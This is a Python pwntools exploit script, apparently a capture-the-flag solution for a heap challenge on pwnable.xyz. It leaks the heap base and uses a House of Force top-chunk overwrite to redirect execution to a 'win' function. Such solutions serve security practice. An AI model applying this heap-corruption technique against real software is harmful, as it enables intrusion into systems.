from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('challenge')
# libc = e.libc
p = remote('svc.pwnable.xyz',30041)
#libc = ELF('./alpine-libc-2.24.so')
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
notes = 0x00000000006012A0
win = e.symbols['win']

def make(size,title,note,m=True):
	sa('>','1')
	sa(':',str(size))
	sa(':',title)
	if m:
		sa(':',note)

def edit(note,data):
	sa('>','2')
	sa(':',str(note))
	sa(':',data)

def _list():
	sa('>','3')

def quit():
	sa('>','0')

make(-1,'A','A',m=False)
make(-1,'B','B',m=False)
edit(1,p64(0)+p64(0x31)+p64(0x42)+p64(0)*4+p64(0xffffffffffffffff))
edit(0,p64(0)+p64(0x31)+p64(0x41)+p64(0)*4+p64(0x21)+p64(0xffffffff)+p64(notes))
_list()
p.recvuntil('\x0a')
heap_base = u64(p.recv(4).ljust(8,'\x00')) - 0x10
log.info('heap_base : {}'.format(hex(heap_base)))
top_chunk = heap_base + 0xa0
log.info('top_chunk : {}'.format(hex(top_chunk)))

hof = (0x0000000000601290 - top_chunk - 0x10 - 0x8 - 80) & 0xffffffffffffffff
print hex(hof)

make(hof,p64(win),p64(win),m=False)

sa('>','1')
sa(':','1')

p.interactive()